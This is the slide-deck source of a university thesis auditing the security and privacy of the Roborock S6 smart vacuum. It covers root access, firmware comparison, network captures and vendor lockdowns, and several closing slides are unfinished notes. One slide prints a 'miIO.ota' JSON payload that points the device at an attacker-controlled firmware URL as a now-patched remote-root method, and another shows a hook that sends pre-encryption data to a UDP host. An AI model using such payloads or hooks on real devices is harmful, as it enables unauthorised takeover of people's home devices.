+++
date = 2022-07-22T08:28:19Z
layout = "bundle"
outputs = ["Reveal"]
title = "Final Thesis Presentation | Andrew Wong"
+++

{{< slide background-image="https://featherbear.cc/UNSW-CSE-Thesis/uploads/covers/0T4A9791.JPG" transition="fade" >}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

### "Smart" Vacuum Cleaners

##### An Audit Into The Security and Integrity of IoT Systems

###### Andrew Wong | UNSW Sydney

---

<style>
img[round] {
  border-radius: 10px;
}
</style>
# Today's Agenda

* Topic recap
* Thesis statement
* Thesis A and B results
* Where we left off (new progress)
* Discussion
* Conclusion

{{% note %}}
This presentation is hopefully less about the 'results' but more addressing the question about security and privacy
{{% /note %}}

---

<style>
.marquee-parent {
  position: relative;
  width: 100vw;
  max-width: 100%;
  height: 200px;
  overflow-x: hidden;
  border-radius: 10px;
}

.marquee-child {
  position: absolute;
  white-space: nowrap;
  will-change: transform;
  max-width: unset !important;
  max-height: 100% !important;
  animation: marquee 360s linear infinite;
}

.marquee-child:hover {
  animation-play-state: paused;
}

@keyframes marquee {
  from { transform: translateX(0); }
  to { transform: translateX(-87.5%); }
}

</style>

<br />
<div class="marquee-parent"><img src="/uploads/20211115-lightbulbs-marquee.png" class="marquee-child" ></div>
</br>
{{% section %}}

_...so there are a lot of IOT devices and IOT brands out there..._

{{% note %}}
Smart watches, smart washing machines, smart flip-flop shoes...
{{% /note %}}

---

🕵️‍♂️ Are competing products looking suspiciously similar to you?  
Most are <u>white-labelled</u> products, the biggest ecosystem vendor being <span style="display: inline-table; vertical-align: middle;"><img src="/uploads/tuya_logo.png" height="40px" alt="Tuya" ></span>

<label>Pros</label>

👨‍💻 Use someone else's code  
💹 Fast profit turnaround

<label>Cons</label>  

⚠️ Use someone else's code  
🔓 Potentially security vulnerabilities

{{% note %}}
FYI not here to tell you whether or not IOT devices are good or not... that's for you to judge. My research is on whether these big players have been doing their part (as providers) to keep us safe
{{% /note %}}

---

IOT ecosystems often have a centralised system to manage their fleet <span style='font-size: 18px'> (devices)</span>.

<label>Pros</label>

A centralised management is <u><i>so</i></u> much simpler/easier/faster/cheaper/'better' than a decentralised one.

<label>Cons</label>  

⚠️ Device functionality dependent on system availability  
⚠️ Little transparency about what/where/when/why data is transmitted

{{% note %}}
Remotely issue firmware updates, commands, send logs, monitor network stability, etcetera
{{% /note %}}

{{% /section %}}

---

# Statement

{{% section %}}

>

<div>
How have manufacturers of IoT / smart home devices addressed the increasing concerns of digital privacy and product security?
<div style="text-align: right; font-size: 20px;">(Specifically Roborock / Xiaomi / Tuya)</span>
</div>

> 

<br />
<br />

* Digital Privacy
    * Investigate the nature of network data
    * i.e. content, frequency, destination, usage
* Product Security
    * Investigate security vulnerabilities
    * Assess the effectiveness of security fortifications

---

<div style="display: flex; flex-direction: row">

<div>
Device in scope: <label>Roborock S6</label> (2019)

A smart vacuum cleaner, with integrations to both <span style="display: inline-table; vertical-align: middle;"><img src="/uploads/tuya_logo.png" height="40px" alt="Tuya" ></span> and <span style="display: inline-table; vertical-align: middle;"><img src="/uploads/xiaomi_smartlife_logo.webp" height="40px" alt="Mijia (Xiaomi)" ></span> (depending on model)
</div>

<img src="/uploads/20211103-s6-pure-banner.webp" width="500px">
</div>

&nbsp;  

> It works pretty well, according to reviews.  
> But is it safe to connect to your home?  

{{% note %}}
Roborock was first tasked by Xiaomi to develop their vacuum cleaner (Mi Robot Vacuum Cleaner) in 2017 - they have since become their own company, developing their own line of vacuum cleaners
{{% /note %}}

{{% /section %}}

---

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Where we left off

---

{{% section %}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Thesis A | Results

---

{{< slide transition="fade" >}}

Thesis A - Disassembled the device (many, many screws)

[<img round src="/uploads/20211030_040050.jpg">](https://www.youtube.com/watch?v=MnvvZbCDcA8)

---

{{< slide transition="fade" >}}

Thesis A - Found the UART pins and got some terminal

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-a/?noControls#/19/5"></iframe>

---

{{< slide transition="fade" >}}

Thesis A - Got root access (Device runs Ubuntu 14.04.3 LTS)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-a/?noControls#/19/7"></iframe>

{{% /section %}}

---

{{% section %}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Thesis B | Results

---

{{< slide transition="fade" >}}

Thesis B - Firmware dump (`dd`) for offline/static analysis

[<img round src="/uploads/20220501-0T4A9824.JPG">](../posts/20220302-progress/#backup)

{{% note %}}
Could have dumped with a flash dumper but I don't own one of those!  
This does mean I only have access to the eMMC rather than being able to dump the firmware of the STM or other chips on the motherboard... but it's probably enough.  

Plus also if there's a firmware update to those chips, I could just look at that.
{{% /note %}}

---

{{< slide transition="fade" >}}

Thesis B - Inspection of system (privileged processes)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/7/2"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Recovery partition manipulation (see [proof of concept](https://www.youtube.com/watch?v=eABmzUfZ22A))

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/12/3"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Capture of device traffic (port-mirroring)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/6"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Inspection of system services (`netstat`, `ip{,6}tables`)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/7/3"></iframe>

---


{{< slide transition="fade" >}}

Thesis B - Remote access persistence (see [proof of concept](https://www.youtube.com/watch?v=om2yzYHU1A0))
<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/8"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Investigating `tcpdump`

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/11/4"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Investigating `rrlogd`

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/11/6"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Investigating `adbd`

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/11/8"></iframe>

{{% /section %}}

---

{{% section %}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Where we left off

---

## From Thesis B (security)

* Finish analysing firmware binaries
* Comparing files against the stock Ubuntu OS
* Check if an IPv6 address is assigned (hence SSH)
  * ans: [no.](../../posts/ipv6-check/)

## From Thesis C (privacy)

* LAN/WAN traffic analysis
  * Look at network behaviour
  * Hook into transmit and receive functions (pre-encrypt / post-decrypt)
* Update to latest version <span style="font-size: 18px">(and hope we don't get locked out)</span>
  * <span style="color: grey; font-size: 18px">disclaimer: we got locked out. hahah....</span>
  * Compare file changes
* Factory reset device, check for remnant files


{{% /section %}}

---

{{% note %}}
Now that we're throwing in a new firmware version, or a few new versions actually...  
What's the best way to explore these?

All of firmware A, then all of firmware B, then all of firmware C?

Or topic 1, firmware A and B and C
then topic 2, firmware A and B and C

The second idea is probably better - as we should be focussing on the _changes_ (i.e. efforts that the company has done) between firmware version
{{% /note %}}

# Firmware Comparison

{{% section %}}

```bash
$> cat /etc/OS_VERSION
ro.product.device=MI1558_TANOS_MP_S2020032500REL_M3.3.0_RELEASE_20200325-204847
$> #              ^^^^^^           ^^^^^^^^
$> #              \/\\//           \\\\////
$> #          Xiaomi v01.15.58  25th March 2020
$> #                                      
```

<label>Aside</label>

* The Roborock S6 was released in June 2019
* The unit I have was manufactured June 2020
  * My unit has a newer base firmware (25th March 2020)
* Note the presence of "<label>MI</label>" at the start of the product string

---

## Stock Ubuntu 14.04.3 LTS

Performed a `diff` check against the [Ubuntu 14.04.3 Core LTS (armhf)](http://cdimage.ubuntu.com/ubuntu-base/releases/14.04/release/ubuntu-base-14.04.3-core-armhf.tar.gz) OS.

> 

* All binaries present on the device matched, <i>except</i> for `ntpdate` (synchronise computer time via NTP)
* Still functionally equivalent

![](/uploads/20220724-snipaste_2022-06-29_02-32-15.jpg)


---

## A new firmware

```diff
-ro.product.device=MI1558_TANOS_MP_S2020032500REL_M3.3.0_RELEASE_20200325-204847
+ro.product.device=TANOS_V2902-2022042802REL_M3.5.8_T4.1.4-2_RELEASE_20220428-202811
-ro.build.display.id=TANOS_MP_R16_RELEASE_20200325-204847
+ro.build.display.id=TANOS_MP_R16_RELEASE_20220428-202811
 ro.sys.cputype=R16.STM32.A3.G1
-ro.build.version.release=1558
+ro.build.version.release=V2902
-ro.build.date.utc=1585140527
+ro.build.date.utc=1651148891
```

The update process performed several incremental updates..  
finally updating to <label>v02.29.02</label> (28th April 2022)

---

## The Official Changelog

```
> 01.17.08 (17th April 2020)
- Supports multi-floor map saving and robot knows which floor it is
- Update to new structured SLAM algorithm to make map more reliable
- Support customised room cleaning sequence
- Support no-mop zone

> 01.19.98 (9th June 2020)
* Improvised Wi-Fi Easy Connect
* overall improvements
* bug fixes
* UX fixes

> 01.20.76 (23rd June 2020)
* Obstacle avoidance enhancements
* Bug fixes and UI optimisation

> probably more updates (got locked out)

> 02.29.02 (28th April 2022)
* Optimized the quick mapping experience
```

---

{{< slide transition="fade" >}}

## The Changelog I Actually Care About

```
> 01.17.08 (17th April 2020)
* Utilities change to busybox
* SSH server changed to dropbear
* /opt/rockrobo/rriot/rriot_rr added (but not enabled)

> 01.19.98 (9th June 2020)
* Serial handler changed to /sbin/rr_login

> 01.20.76 (23rd June 2020)
-

> probably more updates (got locked out)

> 02.29.02 (28th April 2022)
* /opt/rockrobo/rriot/rriot_rr enabled
```

---

## Getting locked out - `rr_login`

```md{5}
...
* /opt/rockrobo/rriot/rriot_rr added (but not enabled)

> 01.19.98 (9th June 2020)
* Serial handler changed to /sbin/rr_login

> 01.20.76 (23rd June 2020)
-
...
```

After the <label>v01.19.98</label> update, serial shell access was denied, uh oh!

{{% note %}}
Did the password change?  
Did I break something?  
Is this the end?  
{{% /note %}}

---


## Lockdown: Authentication

The `vinda` file is no longer used for auth!  

>

Login attempts now verify against
* `[mmcblk0p6]/shadow`
* `[mmcblk0p6]/shadow.sign`.

> But these files don't exist on my device...

Affected: `rr_login` (serial), `dropbear` (SSH), `adbd` (USB)

{{% note %}}
Confirmed by checking against strace / gdb / static analysis (BinaryNinja)
{{% /note %}}

<small><label>Fix</label><br />
[(1)](../posts/upgraded-accessing-the-shell/) Enter bootloader and force entrypoint to a shell<br/>
[(2)](../posts/upgrade-notes/#notice) Patch `/etc/inittab` to revert back to a normal login shell</small>

---

## System Changes

* Are we still using Ubuntu?
  * Maybe? <!-- /etc/os-release seems too say so, but it could be a leftover artifact -->
  * `apt-get` removed
  * `dpkg` removed
* Lots of tools were replaced with BusyBox (v1.24.1)
  * Also a space-saving measure

![](/uploads/20220724-snipaste_2022-07-25_02-50-06.jpg)

---

## Lockdown: Shell

* Serial handler no longer uses `getty` - now a modified version called [`rr_login`](posts/sbin-rr_login/) - `root` access only
* OpenSSH server replaced with modified version of `dropbear` - `root` access only

{{% note %}}
Serial handler is responsible for giving us the UART shell interface)
{{% /note %}}

---

## Lockdown: Firewall

* `ip6tables` rules to drop all IPv6 access!
    * Apps also no longer perform IPv6 (AAAA) DNS requests <!-- i.e. rrlogd: fds -->
* Processes have calls to reinstate dropping SSH access
    * `rrlogd` now drops access on bad version match
        * (previously _only_ allowed access on correct version match)

---


# File Persistence <span style="font-size: 24px">(Upgrade and Reset)</span>

Test untouched directories during a [factory reset](../posts/upgrade-reset-persistence) and [firmware update](../posts/upgrade-upgrade-persistence/)

>

<label>Reset Persistent</label>
* [mmcblk0p11] `/mnt/reserve`

<label>Upgrade Persistent</label>
* [mmcblk0p1] `/mnt/data`
* [mmcblk0p11] `/mnt/reserve`

>

|Partition|Purpose|
|:---:|:---|
|`mmcblk0p1`|Device registration, WiFi, map data, logs|
|`mmcblk0p11`|Statistics, calibration data|

{{% /section %}}

---

# Other changes

## rrlogd (RSA + AES)
encrypts the files before sending.
Instead of decrypting this we can just look at the log files that it extracts

rrlogd can trigger wlanmgr to do a tcpdump (makes sense kinda) - MSG_LOG_DEBUG_ENABLE - MSG_LOG_DEBUG_UPLOAD_DATA
https://featherbear.cc/UNSW-CSE-Thesis/posts/upgraded-tcpdump-usage/


## rriot_rr
New file
/dev/shm/.migrate_to_rriot

## rriot_tuya - used to have `tuya_iot_impl_upload_file` function but no longer has

---

---

# Network Inspection

{{% section %}}

* Isolated sandbox network
  * Router, switch, access point, Vacuum Cleaner
  * Additional NUC to simulate peer data
* Captured packets (unattended) for a month
* Captured packets (interactive) for several sessions
* Filter out network noise
* Compare network activity between old and new firmware

{{% center %}}<img round src="/uploads/Snipaste_2022-05-05_01-31-27.jpg" width="65%">{{% /center %}}

---

## Network Behaviour <span style="font-size: 24px">(FW v02.29.02) (exc FDS) (1 week)</span>

{{% center %}}<img round src="/uploads/20220724-snipaste_2022-07-25_07-41-15.jpg" width="60%">{{% /center %}}

|Endpoint|Protocol|Description|
|:---|:---:|:---|
|`m2.tuyaeu.com`|MQTT|Inbound requests|
|`a2.tuyaeu.com`|HTTPS|Outbound requests|
|`awsde0.fds.api.xiaomi.com`|[FDS](http://docs.api.xiaomi.com/en/fds/)|Logs upload|

---

## Network Geomap <span style="font-size: 24px">(FW v02.29.02) (exc FDS) (1 week)</span>

![](/uploads/20220724-m2-a2-geomap.png)

---

## Observations

* Local traffic - DHCP (5min), Tuya Discovery (5s)
* Connections to America, Germany, China
  * America, Germany - AWS - `fds`, `a2`, `ms`, `m2`
  * China - Mi IO Cloud (v01.15.58 only)
* Increased network activity at 3am <!-- MQTT, A2 -->
  * 3am AEDT is 12am in Beijing
  * Connections are being established - possible timeout/reconnect

## Changes

* New FW uses `m2.tuyaeu.com` instead of `ms.tuyaeu.com`
* New FW no longer polls `xx.ot[t].io.mi.com`
  * No longer uses `miio_client`

---

## What's in the packet?

> Most (if not all) communications were encrypted

<s>1. Break the encryption</s> too much effort

1. Hook into the pre-encryption / post-decryption stages

```
/* Send test to 10.251.252.253:28422 */
void hook(void* data, uint data_len) {
  int sock = create_udp4_connection(IPV4_ADDR(10,251,252,253), 28422);
  send(sock, data, data_len, 0);
}
```

2. Just look at the app logs<i>*</i>

<small><i>*: Application logs are less verbose in newer FW versions<br />
However they communicate the same way as the older FW versions</i></small>

---

## Example MQTT conversation <span style="font-size: 24px">(`{m2,ms}.tuyaeu.com`)</span>

Server Request
```json
{
  "id": 889,
  "method": "get_prop",
  "params": [ "get_status" ]
}
```

Device Response
```json
{
  "id": 889,
  "result": [{
    "msg_ver": 2,
    "msg_seq": 275,
    "state": 8,
    "battery": 100,
    "clean_time": 0,
    "clean_area": 0,
    "error_code": 3,
    "map_present": 1,
    "in_cleaning": 0,
    "in_returning": 0,
    "in_fresh_state": 1,
    "lab_status": 0,
    "water_box_status": 0,
    "fan_power": 102,
    "dnd_enabled": 0,
    "map_status": 1,
    "lock_status": 0,
    "events": []
  }]
}
```

---

## Example Control conversation <span style="font-size: 24px">(`a2.tuyaeu.com`)</span>

Device Request
```
HTTP POST
https://a2.tuyaeu.com/d.json?a=tuya.device.timer.count&devId=...&et=1&t=...&v=4.0&sign=...

{"devId":"...","lastFetchTime":"0","t":1657046157}
```

Server Response
```json
{
  "result": {
    "devId": "...",
    "count": 0,
    "lastFetchTime": 0
  },
  "t": 1657046159,
  "success": true
}		
```

---

## Network Map

<img src="/uploads/network.dark_20220725.png" width="850px" >

{{% /section %}}

---



## Log data

* WAN - security, PII
* LAN - traffic? (tcpdump)


---

# Let's Talk Threats

> Talk about threat models

-
-
-
-
-

---

adb --- touched though didn't crack

---


## ATTACK

- patch the recovery partition mmcblk0p7


## Attack
https://featherbear.cc/UNSW-CSE-Thesis/posts/achieving-upgrade-persistence/


---



# OTA Rooting 

{{% section %}}

```json
{
  "method": "miIO.ota",
  "params": {
    "mode": "normal",
    "install": "1",
    "app_url": "http://192.168.8.110:8322/firmware", // this looks definitely controllable!
    "file_md5": "6e24b0454b170f67676693b759fba742",
    "proc": "dnld install"
  },
  "id": 474627483
}
```

During device initialisation, an OTA update payload could be sent...  
[Remote root / backdoor](https://featherbear.cc/UNSW-CSE-Thesis/posts/ota-updates-blocked-as-of-late-2019/)!!

> However... patched a long time ago

---

* OTA updates during device initialisation were disabled in a  November 2019 firmware update.
  - Remember - Product was released June 2019 <!-- ours was manufactured 06/2020 -->
* This method of attack is limited to devices that are
  * Not yet initialised (else will have to be factory reset)
  * Manufactured within 4 months of the device being first sold
 

![](/uploads/20220719-snipaste_2022-07-20_03-11-19.png)


{{% /section %}}





* UNSW Elec - MUD - they could do this to heighten security
  * note - doesn't prevent them from being malicious from within their own C2 server, but will mitigate modified devices



https://featherbear.cc/UNSW-CSE-Thesis/posts/disclosures/
Response to disclosures
tuya and roborock only have one disclosure listed on their site?
Hard to find
xiaomi paper


Takeaway
Summary (answer main point)

tldr
Who
What 
When
Why
Where
How


---


Address the statement

---

# Thesis in a Year

![](/uploads/screely-1658645824986.png)


---
# Thank You

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />


<hr >

Andrew Wong

<sub>
<p>w: <a href="https://featherbear.cc/UNSW-CSE-Thesis">featherbear.cc/UNSW-CSE-Thesis</a></p>
<p>e: <script>document.write(atob('YW5kcmV3Lmoud29uZ0BzdHVkZW50LnVuc3cuZWR1LmF1'))</script></p>
</sub>